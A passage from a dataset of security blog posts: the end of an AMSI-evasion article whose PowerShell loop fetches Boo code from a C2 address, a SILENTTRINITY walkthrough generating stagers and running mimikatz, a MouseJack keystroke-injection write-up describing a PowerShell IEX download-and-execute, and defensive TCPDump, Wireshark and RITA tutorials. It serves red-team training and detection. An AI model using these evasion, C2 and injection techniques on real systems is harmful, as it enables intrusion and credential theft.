code.\n\nWe also add the 4 Boolang Assemblies as references. Technically you don\u2019t have to add the Boolang DLLs as references in order for the compiler to successfully compile Boolang code. However, if you wanted to do some \u201ccompiler inception\u201d or access any of the Boo Toolchain from within your Boo code you\u2019re gonna need those Assemblies. Additionally, the Boo.Lang.Extension.dll provides some \u201csyntactic sugar\u201d such as context managers which makes things a lot nicer to look at.\n\nOn line 85, we pass our CompilerParameters object to the BooCompiler. After finally compiling our code on line 88 by calling $compiler.Run() we check if there\u2019s a generated Assembly which indicates compilation was successful. We then call GetType(), to retrieve our entry class. Our entry class is going to be called \u201cMyScriptModule\u201d because we did not define a class in our Boo Source code so it\u2019ll automatically create one for us by using the \u201cfake file name\u201d we passed to the StringInput object earlier on line 64. It\u2019ll take everything before the \u201c.boo\u201d extension and append \u201cModule\u201d to it. Hence our class name will be called MyScriptModule.\n\nWe then call GetMethod() to retrieve our Main Boo function and execute it using Invoke().\n\nWe can now dynamically compile & execute Boo code from Powershell!\n\nOk, so how do we go about executing our \u201cmalicious code\u201d without triggering Defender/AMSI? Well, a na\u00efve approach would be to just plop our AMSI test string within our Boolang Source: \n\nThis is not going to work and will trigger Defender because we\u2019re using PowerShell as the \u201chost\u201d language: whenever a PowerShell script gets executed, it\u2019ll be passed to AMSI. AMSI is going to see our Boo Source code since it\u2019s in the PowerShellscript and flag on it. What we need to do is separate our payload (Boo source) from the initial execution vector (our PowerShellscript). If we were using another language as the host (say C#) this may not be necessary.\n\nSo how do we go about separating things out? We could put the Boo code in a separate file on disk but that would be cheating. We\u2019re going to have to write some C2! To keep things simple, we\u2019re going to use HTTP as the communication channel.\n\nhttps://gist.github.com/byt3bl33d3r/1da9d0725a5f1bb8502fce5eda8faa42\n\nWe added a while loop with some inner error handling which will use the Invoke-WebRequest CmdLet to download Boo Source from the URL http://172.16.164.1/source.boo every 5 seconds.\n\nI\u2019ll leave it as an exercise to the reader on how to potentially make this Powershell v2 compatible and return the output of our Boo payload to the C2 server. \u263a\n\nLet\u2019s host our source.boo file which will contain our payload server side using Python\u2019s built-in HTTP Server, and then run it again:\n\nYou can see this time our AMSI Test string successfully gets by Defender. We\u2019re now back to the good old days of throwing source code around instead of compiled binaries. \u263a Additionally, PowerShell logging has no insight into the Boolang code we execute: once the code gets compiled we\u2019re \u201ctransitioning\u201d to another .NET language which PowerShell logging has no insight into.\n\nFinally, the setup/overhead required is much less than doing this with traditional C# tradecraft (at least in my opinion).\n\nDetection\n\nDetection of BYOI tradecraft is difficult and comes down to a number of factors, first and foremost being the \u201chost\u201d language used. When using PowerShell as the host language, there are far more detection opportunities because of the number of defensive technologies and logging in place.\n\nWhen using any other language present by default on Windows that can interact with .NET (e.g. C#, VBA etc\u2026) detection opportunities diminish significantly. While AMSI has been introduced in .NET 4.8 (which is a step in the right direction) it doesn\u2019t really pose much of an obstacle for BYOI payloads due to their dynamic nature.\n\nBecause of this, as of this writing, there really aren\u2019t any straightforward robust detection mechanisms that organizations can implement on endpoints/servers. We can, however, \u201craise the bar\u201d for an attacker using this type of tradecraft (in order to slow them down) by combining several fragile detections mechanisms together and adopting a defense in-depth approach:\n\nAMSI signatures for the default compiled assemblies of all third-party .NET scripting languages (e.g. Boolang, IronPython, SSharp etc..), this would have to be done by Microsoft.\n\nDetecting the use of .NET Scripting Language assemblies loaded within a managed processes\u2019 AppDomain: this can be accomplished with technologies like ETW.\n\nApplication whitelisting to disable the use of .NET scripting languages present by default on Windows and the executables which allow users to interface with them.\n\nEnabling all the standard mitigations that would prevent traditional PowerShell tradecraft: Script Block Logging, Constrained Language Mode, etc.. \n\nThe first one of these, in particular, would start tackling the root of the issue. AMSI signatures for the third party scripting language runtimes are just a band-aid: an attacker could obfuscate/re-compile the assemblies to evade signature detection or even make their own custom scripting language (*hint*). Personally, I think it would be best if Microsoft added some sort of security control within .NET to enable and disable the ability to load & embed scripting languages because this ability undermines a lot of the progress they\u2019ve made in recent years \n\n(I\u2019m not exactly sure if that\u2019s even possible and this ability is a key feature of the .NET platform).\n\nKey Takeaways\n\nLike with every kind of tradecraft, there are some pros and cons.\n\nBy far the biggest issue with this concept is that you cannot take advantage of all the C# tooling that\u2019s been released. You could just call Assembly.Load() within the embedded language to run the tool you want to execute, however, that could trigger AMSI on .NET >= 4.8 (think SharpSploit): you would have to re-implement the tool in the embedded scripting language in order to create an effective bypass.  When It comes to Boolang, this is somewhat alleviated by the fact that SharpDevelop 4.4 has C# to Boo translator. You can literally just paste in C# code and it will translate it to Boolang. This is an insane timesaver: using this I managed to port GhostPack\u2019s Seatbelt to Boo and added it as a post-ex module to SILENTTRINITY in around 20-30 min as supposed to weeks (the codebase is around 6926 lines of code). It would be very interesting to see if it would be possible to create a headless version of the translator and improve upon it. \u263a\n\nAs demonstrated above, BYOI offers an incredible amount of flexibility, allows us to give new life to some tradecraft which is considered not opsec safe or outdated by the Red Teaming community, and shifts the paradigm back to using dynamic scripting languages in our post-exploitation payloads.\n\nFor more examples of BYOI payloads using different combinations of embedded and host languages I highly encourage you to check out the Offensive DLR repository.\n\nAdditionally, SILENTTRINITY is another tool that I wrote which attempts to weaponize some of these concepts and wrap them in a fully-featured C2 tool.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"My First Joyride With SILENTTRINITY\"\nTaxonomies: \"Author, How-To, Informational, Jordan Drysdale, Red Team, Jordan Drysdale, SILENTTRINITY\"\nCreation Date: \"Wed, 05 Feb 2020 13:09:00 +0000\"\n Jordan Drysdale // \n\nTL;DR\n\nSILENTTRINITY (ST) made the news a few times in July 2019, and I wanted to see what all the fuss was about. This article has enough information to get ST installed, the teamserver operational, and a client connected to the teamserver. Once all that is out of the way, we\u2019ll go for the goods. \n\nPre-Req\u2019s for Following Along\n\nDigital Ocean $10/mo Ubuntu 19.10 Node\n\nWindows box[es] for pillaging \n\nPermissions to perform said pillaging \n\nInstall\n\nEach time there seem to be some issues with at least one install directive. But, at this point, my stable install looks something like the following. \n\ngit clone https://github.com/byt3bl33d3r/SILENTTRINITY\napt update && apt upgrade  \napt install python3.7 python3.7-dev python3-pip\nsudo -H pip3 install -U pipenv\ncd SILENTTRINITY  \npip3 install -r requirements.txt\npipenv install && pipenv shell \n\nThe Article I Wrote About SILENTTRINITY\n\nOur story begins with a standard user on a Windows domain who we are going to assume clicked a link or executed an HTA. This user has appropriate (non-admin) privileges and as such limits our ability to easily escalate privileges. From there, the story provides some basic usage and hopefully expands the reader\u2019s and my own knowledge. \n\nAssuming the install went well, let\u2019s get the server up and running. For opsec, we\u2019d do things like ensure the server was running on a categorized domain name, we\u2019d also limit access to the listening services via firewall restrictions, and we also need to be aware that Listeners can be dangerous and may contain vulnerabilities. \n\npython st.py teamserver --port 81 10.10.98.228 BadPassword123\n\nOnce executed, we should get back the certificate fingerprint and a confirmation that the server is running. \n\nNext, we need to get the client side connected. A couple of ways we can go about this. In red team ops, the server would be running on some cloud service or VPS and we\u2019d connect to it from behind our own proxies, VPNs, firewalls, whathaveyou. In this case, I\u2019m just going to open another tmux pane and connect to the server locally. \n\nThere\u2019s a lot going on in the next screenshot. It includes the pwd (opt/SILENTTRINITY) and the preparation of a virtual environment so as not to tamper with all the other python related dependencies on the local system.\n\nThe commands used above, and the additional client connection to the Teamserver are below. \n\npwd\npipenv install && pipenv shell\npython st.py client wss://aptclass:BadPassword123@10.10.98.228:81 \n\nOnce connected, the splash screen:\n\nFrom here, we need to fire up a Listener. \n\nlisteners\nuse https \n\nThe listener\u2019s options menu for HTTPS:\n\nThe stagers / powershell options configuration and my favorite context-based tab completion implementation ever can be seen below. \n\nstagers\noptions \n\nBut really -- I just want the fastest way to malware which was:\n\nstagers\npowershell\ngenerate https \n\n...and\u2026\n\nstagers\nmsbuild\ngenerate https \n\nThe stager.ps1 file was dropped into my /opt/SILENTTRINITY/ directory and was basically ready for execution. The python -m http.server works great to stand up a quick and browsable web server. I also generated a stager.xml for MSBuild, which is quieter and has fewer optics focused in its general direction, though that is changing too. \n\npython -m http.server\n\nThen, from the client, we snag the stager files.\n\n...and...execute them. Full disclosure: PowerShell got flagged. The stager.xml file also got flagged. But, the msbuild.xml was \u201cbuilt\u201d with the following command:\n\nMsbuild.exe stager.xml\n\nAnd, we get our session. \n\nHere, like the Twilight Zone, I control the SIEM, sysmon deployment, the horizontal, and the vertical, and thus, I don\u2019t care if I catch myself. In fact, I hope to. Which, with Sysmon is exceptionally easy. \n\nWe next find the sysmon event IDs by filtering our endpoint sysmon logs in Kibana for event_id:3. As seen below, we have the likely popped host, the process, and the destination IP address.\n\nBut, we might as well keep exploring, right? Egypt always told me he\u2019d start any meterpreter session by validating running processes and process integrity because these things matter. If we can\u2019t read all the process details, we aren\u2019t admin and asking can be an IoC. \n\nLet\u2019s jump into the modules section and run ps. \n\nmodules\nuse boo/ps\nrun \n\nIt\u2019s already game over for this system. We have a privileged shell. \n\nLet\u2019s do it. \n\nuse boo/mimikatz\nrun \n\nCheers all and thanks for reading!\n\nLinks:\n\nST: https://github.com/byt3bl33d3r/SILENTTRINITY \n\nZDNet: https://www.zdnet.com/article/croatian-government-targeted-by-mysterious-hackers/  \n\nSCMag: https://www.scmagazineuk.com/entirely-new-malware-silenttrinity-attacks-croatian-government/article/1590225  \n\nTeamserver security: https://github.com/byt3bl33d3r/SILENTTRINITY/wiki/Teamserver-Security-Considerations-Guidelines  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With TCPDump\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, john strand, TCPDump\"\nCreation Date: \"Mon, 24 Feb 2020 13:07:00 +0000\"\n\nhttps://youtu.be/hC3ANnUXn_o\n\nHello and welcome, my name is John Strand and in this video, we're going to be talking about getting started with TCPDump.  \n\nNow, TCPDump is a fantastic tool, it\u2019s one of the core essential tools that every single IT professional should have, especially Infosec professionals. The reason why is TCPDump gives us the ability to actually see inside the network traffic that's coming and going from our computer system and if we're on a span, port, on a switch or a mirrored port on a switch, or if we\u2019re on a wireless network that broadcasts everything, we can see all the traffic on that particular interface as well.  But the key is, first starting out by identifying which interface you're going to look at. \n\nInside of TCPDump, you can run tcpdump -D\n\nThis will actually list out all of the available interfaces that TCPDump has to be able to sniff on. Now it's generally just good practice 99.99% of the situations to identify the interface you're going to sniff on. And in this situation on my handy-dandy security onion system, you can see that there are multiple interfaces that are running. Specifically, though we're going to be looking at the ethernet interface and this one's named ens33. Now if you're familiar with some older versions of Linux, they used to call everything eth0, eth1, and so on. They changed that recently, we can get into that a little bit later in a video.  But the name of my ethernet interface on my security onion system is ens33. I\u2019m also going to be looking at the local loopback adapter a little bit later. \n\nSo let\u2019s dive in and actually start some sniffing. \n\nSo I can do TCPDump and then I can actually specify my interface and in this situation, I provide ens33, your ethernet interface will most likely be different, and I\u2019m also going to add a couple of additional switches.  \n\nI\u2019m going to add -XA\n\nThe reason why I\u2019m putting in the X and the A is because with those two switches combined, it's going to show me the hexadecimal output and it's going to show me the ASCII code of that hex.  \n\nX is for Hex. A is for ASCII.\n\nWhy is that important? Let me show you. \n\nSo we\u2019re going to run TCPDump, specify the interface is ens33 on my computer system, yours will be different, and I do -XA. Now as soon as I run that, it pops up and it says you do not have permission to actually start sniffing. The reason for this is TCPDump requires Superuser permissions. \n\nOn a Linux or Unix based system, you need to be root.  Or on a Windows computer system, if you're running the Windows equivalent called WinDump, you need me to running as administrator because we're going to be running very very low-level permissions to be able to sniff the traffic on a computer. \n\nNow to get around this error, if you ever get it, all you need to do is put a sudo in front of it. If you\u2019ve seen the xkcd comic, sudo make me a sandwich. \n\nThis is going to switch users and then do the command tcpdump. It\u2019s going to ask me for my password, I put in my password, hit enter and then TCPDump should be running\u2026  if I type my password correctly, which I did not. \n\nThere we go, now it\u2019s running. \n\nSo with this, I now want to start sending traffic that TCPDump can see. So I'm going to start by pinging 8.8.8.8 and that's going to be Google\u2019s DNS server. And as soon as I hit enter, Huzzah! You can see the packets being sent and the responses coming back from Google. \n\nNow what\u2019s interesting about this is I am doing a standard ping of Google, sending an icmp echo request to Google, and you can see that Google is responding. What's interesting is if you look at what's being sent you can see I'm sending to Google could you please send back 0 1 2 3 4 5 6 7 and then the reply, down here you can see the request, and then the reply is 0 1 2 3 4 5 6 7.  Ok, so it\u2019s not all that interesting, alright I get it, so now let\u2019s change this up just a hair okay? \n\nSo now what we're going to do is I'm going to specify a different adapter, I\u2019m going to specify my local loopback adapter. And I\u2019m going to actually send some data back and forth. So whenever I start up TCPDump, I\u2019m going to fire up Netcat, because I'm old, people. I'm going to run Netcat listening on port 2222. Then I'm going to connect, we\u2019re going to send data through that. \n\nSo there I have my Netcat listener and then on the other side, I\u2019m going to do Netcat 127.0.0.1 and then we\u2019re going to go 2222 and then hit enter. And I type HELLOOOOOOOOOOOO, lots of O\u2019s, it\u2019s important. Hit enter and it shows up on the other side. \n\nWhat did I just do? \n\nWell, I created a little port listener on Port 2222 and then I connected and I sent through the data HELLOOOOOOOOOOOO and if we look, you can actually see inside of that packet which is unencrypted. You can see that TCPDump was able to actually see that raw data. \n\nThat's pretty cool.  \n\nNow there\u2019s some other really neat options that you can run with TCPDump. \n\nOne of the things you can do with TCPDump is you can actually read in the contents of a file. So in this situation, I'm reading in a pcap file, but we\u2019re going to spend some more time looking into that actually has command and control backdoor data in it. So we\u2019re going to use taidoor, we're going to look at the traffic, no interactions, just a straight pcap, it\u2019s a really small pcap, we\u2019re going to read in that capture file, we\u2019re going to see the hex decode and the ASCII decode and specifically we want to look at all the data coming and going from a host. \n\nIn this situation, the compromised host is 10.0.2.15 and the port is 80. So whenever I hit enter, it's going to read that data from that capture file and you can see the HTTP requests being sent back and forth. Up here a little bit further you're actually able to see the encoded data with the backdoor being sent. \n\nWe\u2019ll talk more about encoding and decoding a little bit later, but this kind of helps you get started with TCPDump. \n\nOne other quick note, whenever you're running with TCPDump you can run TCPDump and then you can also write out the data to a file. So I\u2019m going to specify my ethernet interface but now I'm going to do the -W, and I\u2019m going to give it a file, ihateclowns2.pcap. \n\nThere we go.  And now what it's going to do is, well if I\u2019m root, I\u2019m going to hit sudo, hit enter and now it\u2019s sniffing on our interface and it's writing all the data to a file. This can then be shared with other Professionals for troubleshooting and offline analysis. \n\nOne of the other great features of TCPDump is it is very fast, very lightweight, and very efficient at capturing and writing out large packet capture files. I hope you had a good time in this video and I hope to see you in the other videos in the very near future.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With Wireshark\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, john strand, Wireshark\"\nCreation Date: \"Wed, 26 Feb 2020 13:11:00 +0000\"\n\nhttps://youtu.be/KYnbfYCkiOc\n\nHello and welcome, my name is John Strand and in this video, we're going to be getting started with Wireshark.\n\nNow, Wireshark is very similar to TCPDump, in fact, a lot of people actually prefer Wireshark to TCPDump, but I look at them as two completely different utilities. TCPDump is fantastic for creating scripts, going through and doing large packet captures on systems and Wireshark is a lot better at doing analysis of systems using a full GUI interface.  \n\nSo let's get started. We\u2019re using the security onion again because the security onion is fantastic for anything with network forensics. Once again, thanks to Doug Burks and crew. \n\nSo let's dive right in.  So we can go into applications and we can go to internet and we can select Wireshark. Once we\u2019re in Wireshark, Wireshark has the ability to list out all of the interfaces on the system. This is once again very similar to what we saw with the TCPDump video with the -D.  I can choose any of the interfaces and it\u2019ll pop up and it'll say, \"hey you need to be running this as root.\" \n\nSo what I\u2019m going to do is do sudo wireshark and it's going to ask me for my password.  So alright, when we first get into Wireshark you're going to be able to see all of your interfaces. \n\nSo down here, if I can zoom in you can see that we have ens33 sending some traffic.\n\nSo I can double click that and it's automatically going to start sniffing on that particular interface. There\u2019s not a lot going on, however, if I actually start up another terminal I can send a ping once again to 8.8.8.8 and then whenever we go back to Wireshark, you can actually see those ICMP echo requests going through. So pretty snifty to actually be able to see your traffic once again.\n\nAnother thing with Wireshark is, if you actually select any of these packets, it's going to break down the actual hexadecimal decode here or the hacks and if you highlight over certain sections and click on the sections within the hacks, it's going to decode what that is in the middle window.  \n\nSo let's go ahead and zoom in on that just a little bit. So if you select this section it says that this is the individual address unicast you can see this is the A and Mac addresses this is in VMware. If I get down to the bottom, this is the actual payload of what's being sent. And with an ICMP echo request and reply on most Linux systems, it's going to send an ICMP echo request with a payload of 0 1 2 3 4 5 6 7. \n\nSo that's pretty neat. \n\nNow, let\u2019s actually go through and open up a file. I\u2019m going to stop my sniff by clicking the little stop button and I\u2019m going to go file, open, recent and I'm going to open up the actual pcap backdoor.  I\u2019m going to continue without saving. Now, this is actually a packet capture from a compromised computer system and this will give me the ability to dig in a little bit on some of the cool things that I can do with Wireshark. \n\nSo, if I can take any one of these packets right, a packet doesn't necessarily exist in most communications, it\u2019s just an individual thing. Some protocols like UDP and ICMP are very very much nonstateful. However, with most TCP protocols, they\u2019re stateful. \n\nSo I'm going to send a packet to a system and it\u2019s going to respond. This is going to be a conversation. I can right-click on any one of these different packets and I can actually go through and apply filters. I can apply a conversation filter or I can look at the individual streams themselves.  \n\nWhat I\u2019m going to do, is I going to do follow TCP strength and this is going to give me the actual communication between these two systems and it's going to display it in such a way that it's easy for me to understand what's going on. \n\nNow, this is clear text HTTP, if it\u2019s encrypted you\u2019re going to see the encrypted data. But you can see that what was being sent between these two systems in this HTTP request, was a get request with our actual command and control data for a backdoor and then an HTTP okay response came back. Now, whenever I applied that, you can see that each of the streams has number values and in this situation, Wireshark said, \"I want you to look at just the stream equal 0.\" I can clear that out by hitting the little x right here. \n\nThe next thing I can do is I can look at some really cool statistics in a packet capture. I can do statistics and then I can look at all of the endpoints that are communicating in this particular packet capture. This allows me if I\u2019m doing threat hunting or doing troubleshooting, to make sure that the IP address that I'm looking for is actually in this communication capture file that I have here as well. \n\nOther things I can do is I can look at statistics and I can actually look at the conversations, how much data is being sent in between these different IP addresses. \n\nSo, what's the address A, what\u2019s the port that\u2019s being used and who is that system actually talking to? How many packets are being sent and how much data is being sent as well? This will allow you to focus in on your top talkers on the network.  \n\nFinally, you can look at statistics and you can go through and look at protocol hierarchy as well. \n\nSo protocol hierarchy will actually breakdown the actual protocols that are being used in this particular packet capture itself. And in this situation you can see that we have ethernet, we have IPV4, we have some net bios traffic but we also have some TCP and some HTTP traffic as well. \n\nNow the reason why you would do this, honestly, is because if you're trying to break down a packet capture and you\u2019re trying to understand what a system or a series of systems is doing, it really helps to kind of step back and say okay who's talking with whom and then drill down to the specific IP address or IP addresses that you're looking forward to talking to as well. \n\nFinally, you can do statistics and you can actually look at the HTTP conversations as well and this will actually show you the HTTP requests that are being sent into the computers. \n\nSo this is just a quick overview of Wireshark, once again it isn\u2019t meant to be exhaustive, but this is definitely a start for people that have never used Wireshark. Once again we're using the security onion because we absolutely love that distribution and everything that they do because all these tools are built-in and yes you can get Wireshark for Mac and for Windows as well. I can't wait to see you in the next video!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Detecting Malware Beacons With Zeek and RITA\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, john strand, RITA, Zeek\"\nCreation Date: \"Tue, 03 Mar 2020 13:10:00 +0000\"\n\nhttps://youtu.be/eETUi-AZYgc\n\nHello and welcome, my name is John Strand and in this video, we're going to be talking a little bit about beaconing using RITA. Now, for this particular video, I'm not using the security onion, instead we're going to be using ADHD. If you want to find ADHD, go to the ActiveCountermeasures.com website. Go to our projects, you'll see RITA and Passer and a bunch of tools there, and one of the tools is the Active Defense Harbinger Distribution and that's what I'm going to be using today.\n\nNow, the reason why are we using ADHD is a couple of reasons. One, we have step by step instructions on how to use ADHD for this particular video and we have a pcap that's already been imported so we could talk about beaconing so you can actually follow along. \n\nOnce you're inside of ADHD, the first thing that you're going to be doing is jumping into attribution. Go all the way down to RITA. Now RITA stands for Real Intelligence Threat Analytics. If you're looking at what RITA is compared to AI Hunter, our commercial tool, RITA is basically all of the logic, all of the math, all of the horsepower, all for free. Active Countermeasure's AI Hunter, or Actual Intelligence Hunter, is actually the GUI platform, notifications, all of the stuff you'd expect to see in an enterprise environment. \n\nNow within Rita, we're going to follow these basic instructions and in fact, I already have run this. To actually get RITA to work, you just cd into home/ADHD/tools and go into the enterprise lab. Then normally what you would do with a bro logs setup, is you would go into bro and you would then load in that data, let bro parse it, and then you would use RITA. You would do RITA import and you would give it the path to the bro logs and then a destination database and then it will parse everything. Then you do RITA analyze and then it does its analytics and it's ready to go. \n\nYou don't have to do that inside of ADHD it's already been done for you. \n\nAlso, in this particular video, I've already got the Mongo database started and I have the HTML report generated. So I'm going to show you what that looks like. This is the HTML output. It has a number of different output features, it can do text, it can do JSON connect directly into Mongo. I'm looking at the HTML because it lends itself better to videos, like this one. \n\nSo, if we jump into VSagent, this is actually a packet capture for a specific time frame that has been imported by bro. Then RITA has analyzed it and we have a number of things we're going to look at. I'll talk about these in separate videos. \n\nThe first one I'm going to talk about is beacons. We'll talk a little bit about what it means to be a beacon for these things. \n\nHere, you can see that we have a source IP address of 10.234.234.100 and a destination IP address of 138.197.117.74. You can also see that there was 4,532 connections. \n\nNow, about those connections, what exactly does it mean to be a beacon? \n\nWhenever you're looking at it from a mathematics perspective, you can use a number of algorithms such as K-means Clustering, to basically do some basic analysis as far as what is consistent about these connections. We actually don't use K-means Clustering. K-means is something that's available in Splunk, it's a fantastic utility, but it's all about finding the right algorithms for the right problem. \n\nIn this scenario, RITA uses MADMOM, median average distribution of the mean. \n\nWhat exactly does that mean? \n\nWhenever you're looking for a beacon, let's get some philosophy here for a second. Here we have a chair. How do you know that that's a chair? Now this goes back to the earlier days of philosophy when you're talking about Plato, and I know this sounds weird, trust me, it's technical, stick with me. Plato basically said that everything that we have in the world is basically an imitation or a shadow of a true form. So somewhere in the universe was a perfect chair and every other chair was just a variation on that chair.\n\nWell, it turns out in computer science, whenever you're doing things like K-means Clustering, using artificial intelligence, and machine learning, you're doing something very similar. What you're doing is saying these are the characteristics of a perfect chair. Or, in this situation, a perfect beacon. \n\nIf we were going to say what a perfect beacon was, what are all the things we would say to make it perfect? Well, interval. \n\nInterval is like a heartbeat. Some heart beats are slow and some heart beats are much faster. If there's a consistency in these different connections, then you have a consistent heartbeat. That may be one aspect of a beacon. \n\nAnother thing you can look at can be data size. If all the packets are the exact same size as what's being sent and what's being received, that can be a sign of that beaconing activity of saying, \"Is there a command? No. Is there a command? No. Is there a command? No. Is there a command? No.\" And we can look for those consistencies in those packets. \n\nWe can even look for inconsistencies to find consistencies. \n\nLet me explain. \n\nWhenever you're looking for inconsistencies to find consistencies, you may have jitter or dispersion in your packet connections. \n\nSo what that would mean, is let's imagine that we have a 10-second interval with 20% jitter on either side. That means that all of your packets would be between a range of 8 seconds and 12 seconds, 2 seconds on either side of 10 seconds, and you would see a distribution where that would be 50% from 10 to 12, and 50% from 8 to 10. We can actually look for that as well. RITA does all of this and it does it fairly quickly and it does it for free across every single connection in a packet capture. \n\nThat's RITA, when we're talking about beacons. So ideally what you would do is you would sort this, you can export it to an Excel spreadsheet if you'd like, and you look at the score. Now there are a bunch of different systems that have high scores in here but a couple of things that are interesting.\n\nFirst, you're going to see a lot of Google and Microsoft data within these connections. This particular system is a DigitalOcean IP address. Basic research can tell us one of these is not like the other. \n\nThe other thing is the shear number of connections. A lot of these other ones you have a small number of connections going to known good IP addresses. In our evil backdoor we have a high number of connections that is running at a very consistent interval.\n\nNow does this mean that every single thing that beacons at a high interval connection is evil? No, but it does mean that you want to look into it. It means it's not human behavior and yes RITA does have the capability of actually importing a whitelist and then filtering those things out. \n\nOnce again, that's why we do AI Hunter. \n\nSo that is our little video talking about beaconing. I hope you enjoyed it and I hope you get a chance to play with RITA in the Active Defense Harbinger Distribution.\n\nNow once again, once you get into the Active Defense Harbinger Distribution, the user ID and password is ADHD and ADHD, you'll go to attribution, you will drop down and you're going to see RITA. Once you open up and follow the instructions, you open up a packet capture then select beacons and below the beacon data for that packet capture. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Executing Keyboard Injection Attacks\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, Raymond Felch\"\nCreation Date: \"Wed, 04 Mar 2020 13:11:00 +0000\"\nRay Felch //\n\nPreface:\n\nFollowing the work of the Bastille Research Group (See: https://github.com/BastilleResearch/mousejack), I was interested in knowing if these (keyboard injection) vulnerabilities were still valid. To my surprise, I was able to duplicate the attack on an inexpensive Logitech keyboard that I already had in my possession. This keyboard (Logitech K400r) is still available at my local Walmart for under $20. In particular, wireless devices using the Unifying receiver (depicted with the orange star) are particularly vulnerable.\n\nFrom my initial research, it appears that communication (keystrokes) from the wireless keyboard is encrypted to prevent eavesdropping and that mouse movements are usually sent unencrypted. The MouseJack exploit takes advantage of vulnerable dongles by allowing unencrypted keystrokes to be passed to the target computer's operating system as legitimate packets.\n\nThis wireless (non-Bluetooth) attack scenario can be accomplished with a fairly inexpensive radio dongle, a tiny script, and from a distance of up to 100 meters away! \n\nI have outlined my process below.\n\nHardware: Crazy Radio PA dongle\n\nKeyboard: Logitech K400r\n\nFCC ID: JNZYR0019\n\nFortunately for this project, the FCC information pertaining to this device is not really all that necessary, however it is good to know that it is intended to operate wirelessly within the 2.405 - 2.474GHz WiFi range.\n\nKeyboard Injection Payload:\n\nIn preparation for our intended attack, we need to create a short text file based on the Rubber Ducky scripting language (for more info: https://github.com/hak5darren/USB-Rubber-Ducky/wiki).  Using any text editor (nano, vi, notepad, etc), enter the following and save the file:\n\nDELAY 500\nGUI r \nDELAY 500\nSTRING notepad.exe \nENTER \nDELAY 1000 \nSTRING Hello World! \n\nExample using nano text editor\n\nGUI r simulates holding the Windows key and clicking 'r' to open the Run Window\n\nSTRING notepad.exe obviously types notepad.exe in the Run Window, opening Notepad.\n\nSTRING Hello World! gets typed into the newly open Notepad page\n\nNote: Although some delays may be required to ensure reliable operation when using the Rubber Ducky USB dongle, such is not the case when implementing our attack using the CrazyRadio dongle. This is because we aren't loading any USB drivers or trying to detect any USB dongle being plugged into the USB port. The delays in this case are for demonstration purposes. Ideally, we would want to execute our script and inject our payload as quickly as possible to avoid human detection, but also not at the risk reliable operation.\n\nDownload JackIt:\n\ngit clone https://github.com/insecurityofthings/jackit.git\n\ncd jackit\n\npip install -e .\n\nRun JackIt with payload script 'hello.txt'\n\nOnce target is identified, CTRL-C and select Target Key(s) to inject payload\n\nNOTE: Knowing the MAC address is not required to pull off this attack. All that is required is the target KEY and that the TYPE has a valid entry, Logitech HID, Microsoft HID, etc.  (an empty field or 'unknown' will not work.)\n\nSUCCESS!!!\n\nCloud Based PowerShell Injection:\n\nRealizing that keyboard payload injection was now possible, my next step was to attempt injecting a PowerShell payload using this proven attack method.\n\nFirst, I created a github repository to host my PowerShell injection script.\n\nNext, I modified my 'hello.txt' script to run PowerShell instead of notepad, and I changed the injection string from Hello World! to a PowerShell Invoke Expression (IEX) cmdlet that downloads a .ps1 script and executes it on the target computer.\n\nRunning JackIt with the modified 'hello.txt' script now produced the desired results! I was clearly able to inject cloud based PowerShell execution using known vulnerabilities in a Logitech HID.\n\nSummary:\n\nI'm glad that I started with the vulnerable keyboard, as none of the mice in my possession could be injected, even though they're clearly Logitech Unify receivers and had the orange star markings. I suspect this might be due to the fact that Logitech implements dongle firmware that can be updated, where as many of the mice already in the field use one-time programmable flash devices. \n\nMicrosoft has issued a security update (https://support.microsoft.com/en-us/help/3152550/microsoft-security-advisory-update-to-improve-wireless-mouse-input-fil) that checks to see if the communicated payload coming from the dongle is QWERTY and if the device TYPE is of a mouse, then the packet will be ignored. However, from what I can determine, this security update is basically optional. Based on this information, I have decided to order a few Microsoft mice and test these devices to continue my research.\n\nRegardless, I suspect that there are hundreds of thousands of vulnerable keyboards and mice in the wild, and this often overlooked attack vector is one that needs to be taken seriously.  Most users might think, \"oh, it's just a keyboard ... it's just a mouse ... what harm can they cause?\" The fact is, a keystroke injection that simply displays \"Hello World!\" could have just as easily been a PowerShell injection that executes Metasploit, downloads Malware or a virus, exfiltrates sensitive data, elevates privileges, gains persistence, etc. \n\nPossible mitigation could consist of using bluetooth or wired devices rather than wireless or removing the dongles when not in use, or getting firmware and security updates in a timely manner when they are available. Obviously, these options can take away from the overall 'user experience', so most or all of them may not be implemented at all.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Detecting Long Connections With Zeek/Bro and RITA\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, bro, RITA, Zeek\"\nCreation Date: \"Wed, 18 Mar 2020 21:01:38 +0000\"\n\nhttps://youtu.be/BYwYFSQz3QI\n\nHello and welcome, my name is John Strand and in this video, we\u2019re going to be talking about RITA, Real Intelligence Threat Analytics and how it can quickly do DNS analysis to find DNS backdoors in your environment. \n\nSo once again we are using ADHD, if you want to find ADHD just go to ActiveCountermeasures.com go to projects, select ADHD and then you can download it. On that virtual machine, once you login with user ID and password of ADHD, ADHD, you'll be able to get in, login, and then right on the desktop, you're going to find our instructions document. Inside of that document, if you select attribution and you go RITA, so if we start at the beginning, close this out. If I go usage, ADHD usage, opens the document and then if I go to attribution and select RITA, it'll take you right to the instructions that I'm working through.\n\nOnce again, we're using ADHD instead of Security Onion today because ADHD has this packet capture, that I use in my Cyber Deception Active Defense class for various classes like Black Hat and Wild West Hackin' Fest, built into it. \n\nYou would follow these instructions to basically get to the point where I'm at right now. Now as part of following those instructions, I have already done the Julia Child's thing and I have already generated an HTML output report from RITA. Hello, look, it's done!\n\nSo we're going to go into DNS Cat, I'm going to go into 2017. Yes, it's a little bit old, but trust me. TCP, IP, and UDP haven't changed all that much since then. \n\nWe are going to open up this particular capture file. Then we are going to go into DNS. \n\nNow, once we get into DNS, there's a couple of things I'd like to talk about. First, whenever you're thinking of 